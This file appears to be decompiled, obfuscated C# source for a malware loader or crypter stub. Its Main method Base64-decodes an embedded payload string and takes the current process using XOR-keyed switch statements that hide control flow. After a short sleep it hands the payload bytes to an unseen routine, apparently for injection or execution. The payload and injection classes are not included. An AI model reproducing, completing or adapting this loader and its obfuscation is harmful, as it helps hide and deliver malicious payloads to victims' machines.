using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;
using ns0;
using ns3;

namespace ns2;

internal sealed class Class2
{
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern void Sleep(long long_0);

	[STAThread]
	public static void Main()
	{
		string string_ = Class0.smethod_0(944785561, 2);
		byte[] byte_ = smethod_1(string_, 246, 254);
		string string_2 = Class4.smethod_1(smethod_0(909, 967), 330, 352);
		Sleep(100L);
		Class3.smethod_2(byte_, string_2);
		ProjectData.EndApp();
	}

	internal static Process smethod_0(int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 74:
				return Process.GetCurrentProcess();
			}
		}
	}

	internal static byte[] smethod_1(string string_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 8:
				return Convert.FromBase64String(string_0);
			}
		}
	}

	internal static IntPtr smethod_2(int int_0, int int_1, int int_2)
	{
		while (true)
		{
			switch (int_2 ^ int_1)
			{
			case 97:
				return (IntPtr)int_0;
			}
		}
	}

	internal static byte[] smethod_3(int int_0, int int_1, int int_2)
	{
		while (true)
		{
			switch (int_2 ^ int_1)
			{
			case 4:
				return BitConverter.GetBytes(int_0);
			}
		}
	}
}
